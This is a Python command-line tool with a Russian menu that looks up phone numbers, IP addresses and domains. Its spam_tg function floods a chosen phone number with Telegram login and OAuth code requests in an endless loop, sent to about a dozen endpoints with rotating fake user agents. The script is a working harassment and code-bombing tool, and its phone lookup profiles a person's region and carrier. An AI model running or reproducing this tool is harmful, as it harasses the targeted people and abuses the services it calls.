import customtkinter
from bs4 import BeautifulSoup
from socket import gethostbyname
from colorama import Fore, Style
import fake_useragent
import webbrowser
import threading
import requests
import random
import string
import random
import time
import json
import os

purple = Style.DIM + Fore.MAGENTA

user_agent = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
base_phone = {}
base_ip = {}
base_site = {}

def printDelay(color, text):
    for char in text:
        print(color + char, end='', flush=True)
        time.sleep(0.1)
    print()

banner = f"""
       ███▄    █  ▒█████      ██░ ██  ▄▄▄     ▄▄▄█████▓▓█████
       ██ ▀█   █ ▒██▒  ██▒   ▓██░ ██▒▒████▄   ▓  ██▒ ▓▒▓█   ▀
      ▓██  ▀█ ██▒▒██░  ██▒   ▒██▀▀██░▒██  ▀█▄ ▒ ▓██░ ▒░▒███
      ▓██▒  ▐▌██▒▒██   ██░   ░▓█ ░██ ░██▄▄▄▄██░ ▓██▓ ░ ▒▓█  ▄
      ▒██░   ▓██░░ ████▓▒░   ░▓█▒░██▓ ▓█   ▓██▒ ▒██▒ ░ ░▒████▒
      ░ ▒░   ▒ ▒ ░ ▒░▒░▒░     ▒ ░░▒░▒ ▒▒   ▓▒█░ ▒ ░░   ░░ ▒░ ░
      ░ ░░   ░ ▒░  ░ ▒ ▒░     ▒ ░▒░ ░  ▒   ▒▒ ░   ░     ░ ░  ░
         ░   ░ ░ ░ ░ ░ ▒      ░  ░░ ░  ░   ▒    ░         ░
              ░     ░ ░      ░  ░  ░      ░  ░           ░  ░
"""

funcbanner = """
              ╔════════════════════════════════════╗
              ║               ФУНКЦИИ              ║
              ╠════════════════════════════════════╣
              ║         Пробив по номеру: 1        ║
              ║           Пробив по IP: 2          ║
              ║        Узнать ip по домену: 3      ║
              ║        Спамер для telegram: 4      ║
              ╠════════════════════════════════════╣
              ║              Выход: 0              ║
              ║           Отчёт: -report           ║
              ╚════════════════════════════════════╝
"""

def search_phone(phone: str):
    url = f"https://fincalculator.ru/api/tel/{phone}"
    mnp = f"https://xn----dtbofgvdd5ah.xn--p1ai/php/mnp.php?nomer={phone}"
    response = requests.get(url, headers={'User-Agent': user_agent})
    mnp_rep = requests.get(mnp, headers={'User-Agent': user_agent})
    data = json.loads(response.text)

    oper = data["operator"] if data["operator"] != "" else "Не найдено"
    if mnp_rep.text != "﻿no":
        oper = oper + " был перенесён на " + mnp_rep.text

    base = {
        "Query": phone,
        "Country": data["country"] if data["country"] != "" else "Не найдено",
        "Region": data["region"] if data["region"] != "" else "Не найдено",
        "Oper": oper
    }

    print(Fore.YELLOW + "\nPhone Info📞")
    printDelay(Fore.YELLOW, f"Страна: " + base["Country"])
    printDelay(Fore.YELLOW,  f"Регион: " + base["Region"])
    printDelay(Fore.YELLOW,  f"Оператор: " + base["Oper"])

    global base_phone
    base_phone = base


    print("")
    input(Style.DIM + Fore.WHITE + "[PRESS ENTER TO CONTINIE...]")
    os.system("clear")

def search_ip(ip: str):
    url = f"https://ipinfo.io/{ip}/json"
    response = requests.get(url, headers={'User-Agent': user_agent})
    data = response.json()

    base = {
        "Query": ip,
        "Country": data.get('country', "Не найдено"),
        "Region": data.get('region', "Не найдено"),
        "City": data.get('city', "Не найдено"),
        "Org": data.get('org', "Не найдено"),
    }

    print(Fore.YELLOW + "\nIP Info🌐")
    printDelay(Fore.YELLOW, f"Страна: " + base["Country"])
    printDelay(Fore.YELLOW, f"Регион: " + base["Region"])
    printDelay(Fore.YELLOW, f"Город: " + base["City"])
    printDelay(Fore.YELLOW, f"Провайдер: " + base["Org"])

    global base_ip
    base_ip = base

    print("")
    input(Style.DIM + Fore.WHITE + "[PRESS ENTER TO CONTINIE...]")
    os.system("clear")

def spam_tg(phone: str):
    urls = [
        'https://translations.telegram.org/auth/request',
        'https://my.telegram.org/auth/send_password',
        'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F',
        'https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
        'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
        'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
        'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
        'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
        'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
        'https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&return_to=https%3A%%2Fbot-t.com%2Flogin',
        'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
        'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
        'https://oauth.telegram.org/auth/request?bot_id=5082101769&origin=https%3A%2F%2Fauth.smartbotpro.ru&request_access=write&lang=ru&return_to=https%3A%2F%2Fauth.smartbotpro.ru%2Fauth%2Flogin%2F',
        'https://oauth.telegram.org/auth/request?bot_id=366357143&origin=https%3A%2F%2Fwww.botobot.ru&embed=1&request_access=write&lang=ru&return_to=https%3A%2F%2Fwww.botobot.ru%2Fblog%2Fru%2Fvoiti-cherez-telegram-avtorizatsiia-na-saitie-botobot%2F'
    ]

    while True:
        for url in urls:
            user = fake_useragent.UserAgent().random
            headers = {'user-agent': user}

            try:
                requests.post(url, headers=headers, data={'phone': phone})
                print(Style.DIM + Fore.WHITE, f"[+]: Sended to {phone}, succesfull")
            except:
                print(Style.DIM + Fore.RED, f"[-]: Not sended to {phone}, error")
            time.sleep(2)

def get_ip(domen: str):
    ip = gethostbyname(domen.split('/')[2]) if '/' in domen else gethostbyname(domen)

    base = {
        "Query": domen,
        "IP": ip
    }

    print(Fore.YELLOW + "\nDomen Info📰")
    printDelay(Fore.YELLOW, f"IP: {ip}")

    global base_site
    base_site = base

    print("")
    input(Style.DIM + Fore.WHITE + "[PRESS ENTER TO CONTINIE...]")
    os.system("clear")
    
def main():
    while True:
        Fore.RESET

        print(purple + banner)
        print(Style.DIM + Fore.WHITE + funcbanner)
        print()
        select = input(Style.DIM + Fore.WHITE + "[ENTER THE FUNCTION NUMBER]: ")

        if select == "1":
            phone = input(Style.DIM + Fore.WHITE + "[ENTER THE PHONE]: ")
            search_phone(phone)

        if select == "2":
            ip = input(Style.DIM + Fore.WHITE + "[ENTER THE IP]: ")
            search_ip(ip)

        if select == "3":
            domen = input(Style.DIM + Fore.WHITE + "[ENTER THE DOMEN]: ")
            get_ip(domen)

        if select == "4":
            phone = input(Style.DIM + Fore.WHITE + "[ENTER THE PHONE]: ")
            spam_tg(phone)

        if select == "0":
            break

os.system("clear")
main()
